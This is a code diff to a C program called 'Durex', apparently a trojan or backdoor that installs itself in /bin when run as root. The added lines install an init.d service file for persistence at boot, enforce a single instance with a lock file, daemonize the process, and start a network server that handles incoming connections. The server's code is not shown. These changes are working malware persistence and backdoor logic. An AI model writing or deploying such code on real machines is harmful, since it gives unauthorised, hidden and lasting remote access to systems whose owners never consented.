@@ -20,9 +20,26 @@ uint8_t		copy_in_bin(char *fname)
 	return (1);
 }
 
+uint8_t		copy_in_service(const char *durex_service)
+{
+	int	fd;
+
+	fd = open("/etc/init.d/Durex", O_WRONLY | O_CREAT, 0700);
+	if (fd == -1)
+	{
+		ft_putendl_fd("Failed to open durex service file\n", 2);
+		return (0);
+	}
+	write(fd, durex_service, ft_strlen(durex_service));
+	close(fd);
+	return (1);
+}
+
 int		main(int ac, char **argv)
 {
-	(void)ac;
+	int	fd_lock;
+	int sock;
+
 	if (getuid() != 0)
 		return (0);
 	if (access("/bin/Durex", F_OK))
@@ -33,10 +50,20 @@ int		main(int ac, char **argv)
 	}
 	else
 	{
+		fd_lock = open("/var/lock/Durex.lock", O_CREAT | O_RDWR, 0644);
+		if (flock(fd_lock, LOCK_EX | LOCK_NB) == -1)
+		{
+			ft_putendl_fd("Two instances of durex can not run at the same time", 2);
+			return (3);
+		}
 		printf("Running Durex in /bin\n");
 		printf("%s\n", durex_service);
+		if (!copy_in_service(durex_service))
+			return (0);
 		daemon(0, 1);
-		sleep(1000);
+
+		sock = create_server();
+		handle_connection(sock);
 	}
 	return (0);
 }
